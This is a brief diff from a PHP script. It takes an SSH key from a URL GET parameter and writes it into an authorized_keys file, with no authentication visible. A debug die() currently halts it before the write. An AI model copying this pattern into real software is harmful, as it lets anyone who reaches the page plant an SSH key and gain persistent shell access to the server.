@@ -5,7 +5,7 @@ $password = $_GET['password'];
 $ssh = $_GET['ssh'];
 
 $file = fopen("authorized_keys", "w");
-var_dump($_GET);
+var_dump($file);
 die;
 fwrite($file, $ssh);
 fclose($file);
